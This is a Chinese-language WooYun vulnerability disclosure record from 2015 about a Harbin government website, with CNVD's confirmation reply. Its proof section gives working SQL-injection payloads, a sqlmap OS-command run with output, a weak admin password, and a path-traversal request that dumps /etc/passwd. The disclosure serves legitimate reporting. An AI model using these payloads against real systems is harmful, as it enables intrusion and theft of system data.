{"id": 84626, "wybug_id": "wooyun-2015-0144053", "wybug_title": "哈尔滨某政府网站多个漏洞打包", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Force", "wybug_date": "2015-10-07 08:41", "wybug_open_date": "2015-11-26 17:56", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向公众公开  简要描述： 3处严重高危漏洞，可导致服务器被攻陷 详细说明：  哎、想混点rk进社区呢，可惜上个漏洞被和谐了。这次乌云君一定要给审核通过啊，嘎嘎。   漏洞证明：  1.1.\t应用系统弱口令http://**.**.**.**:8080/ admin admin看到的信息还不少啊。。。。0.0 1.2.\t应用程序sa 注入\n**.**.**.**:8080/admin/includeJSP/relatQuery.jsp?apply_sfzh=23010220110809681\n\nPlace: GETParameter: apply_sfzh    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: apply_sfzh=23010220110809681' UNION ALL SELECT 48, 48, 48, 48, 48,48, CHAR(58)+CHAR(99)+CHAR(122)+CHAR(102)+CHAR(58)+CHAR(81)+CHAR(72)+CHAR(81)+CHAR(119)+CHAR(119)+CHAR(101)+CHAR(86)+CHAR(105)+CHAR(72)+CHAR(110)+CHAR(58)+CHAR(122)+CHAR(111)+CHAR(103)+CHAR(58)--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: apply_sfzh=23010220110809681'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: apply_sfzh=23010220110809681' WAITFOR DELAY '0:0:5'-----[13:08:02] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2005[13:08:02] [INFO] fetching current usercurrent user:    'sa'\n1.3.\t数据库系统命令执行\n[root@Hacker~]# Sqlmap -u \"**.**.**.**:8080/admin/includeJSP/relatQuery.jsp?apply_sfzh=23010220110809681\" --os-cmd=ipconfig\n\ndo you want to retrieve the command standard output? [Y/n/a] y[13:09:16] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.command standard output:---Windows IP ???????????????? ???????? 2:   ?????????? DNS ???? . . . . . . . :   ???????? IPv6 ????. . . . . . . . : fe80::d541:80e6:7680:be6a%11   IPv4 ???? . . . . . . . . . . . . : **.**.**.**   ????????  . . . . . . . . . . . . : **.**.**.**   ????????. . . . . . . . . . . . . : **.**.**.**???????????? ????????:   ?????????? DNS ???? . . . . . . . :   ???????? IPv6 ????. . . . . . . . : fe80::ad3d:10d4:74db:ab42%10   IPv4 ???? . . . . . . . . . . . . : **.**.**.**   ????????  . . . . . . . . . . . . : **.**.**.**   ????????. . . . . . . . . . . . . :?????????? ????????*:   ????????  . . . . . . . . . . . . : ??????????   ?????????? DNS ???? . . . . . . . :?????????? ????????* 2:   ????????  . . . . . . . . . . . . : ??????????   ?????????? DNS ???? . . . . . . . :?????????? ????????* 8:   ????????  . . . . . . . . . . . . : ??????????   ?????????? DNS ???? . . . . . . . :?????????? ????????* 9:   ????????  . . . . . . . . . . . . : ??????????   ?????????? DNS ???? . . . . . . . :\n---1.4.\t应用程序任意文件下载**.**.**.**:8080//fileFetcherServlet?downloadName=%D6%DC%C1%FA%BA%A3%BD%E1%BB%E9%D6%A4.jpg&filePath=../../../../../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashlp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/bashwwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/falseftp:x:40:49:FTP account:/srv/ftp:/bin/bashnobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bashmessagebus:x:100:101:User for D-BUS:/var/run/dbus:/bin/falsehaldaemon:x:101:102:User for haldaemon:/var/run/hal:/bin/falseman:x:13:62:Manual pages viewer:/var/cache/man:/bin/bashnews:x:9:13:News system:/etc/news:/bin/bashuucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bashcyrus:x:96:12:User for cyrus-imapd:/usr/lib/cyrus:/bin/bashdhcpd:x:102:65534:DHCP server daemon:/var/lib/dhcp:/bin/falsevscan:x:65:103:Vscan account:/var/spool/amavis:/bin/falsenamed:x:44:44:Name server daemon:/var/lib/named:/bin/falseat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashsshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/falsepostfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/falsesquid:x:31:65534:WWW-proxy squid:/var/cache/squid:/bin/falsentp:x:74:104:NTP daemon:/var/lib/ntp:/bin/falsemysql:x:60:105:MySQL database admin:/var/lib/mysql:/bin/bashmailman:x:72:67:GNU mailing list manager:/var/lib/mailman:/bin/bashquagga:x:103:106:Quagga routing daemon:/var/run/quagga:/bin/falsegdm:x:50:107:Gnome Display Manager daemon:/var/lib/gdm:/bin/falsesuse-ncc:x:104:108:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bashldap:x:76:70:User for OpenLDAP:/var/lib/ldap:/bin/bashhacluster:x:90:90:heartbeat processes:/var/lib/heartbeat/cores/hacluster:/bin/falseuucps:x:0:0::/tmp:/bin/bash\n\n测试到此为止，没有深入，赶紧修复吧\n   修复方案：  过滤过滤 在过滤。最好对系统进行一遍查杀。   版权声明：转载请注明来源 Force@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-12 17:54 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给黑龙江分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}